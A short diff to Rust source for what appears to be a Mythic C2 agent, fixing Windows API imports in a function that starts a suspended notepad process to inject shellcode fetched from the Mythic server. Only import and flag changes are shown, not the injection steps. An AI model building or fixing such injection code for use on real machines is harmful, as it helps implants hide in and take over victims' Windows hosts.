@@ -1,6 +1,7 @@
 use serde::{Deserialize, Serialize};
 use std::error::Error;
 use std::result::Result;
+use crate::{AgentTask, mythic_success, mythic_error};
 
 #[cfg(target_os = "windows")]
 use std::fs;
@@ -165,8 +166,7 @@ fn get_shellcode_from_mythic(file_id: &str) -> Result<Vec<u8>, String> {
 #[cfg(target_os = "windows")]
 unsafe fn create_process_and_inject(shellcode: &[u8]) -> Result<String, String> {
     use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
-    use winapi::um::winnt::{PROCESS_CREATE_SUSPENDED};
-    use winapi::shared::winerror::ERROR_SUCCESS;
+    use winapi::um::winbase::CREATE_SUSPENDED;
     
     // Create a suspended notepad process
     let mut si: STARTUPINFOW = std::mem::zeroed();
@@ -181,7 +181,7 @@ unsafe fn create_process_and_inject(shellcode: &[u8]) -> Result<String, String> 
         std::ptr::null_mut(),
         std::ptr::null_mut(),
         FALSE,
-        PROCESS_CREATE_SUSPENDED,
+        CREATE_SUSPENDED,
         std::ptr::null_mut(),
         std::ptr::null_mut(),
         &mut si,
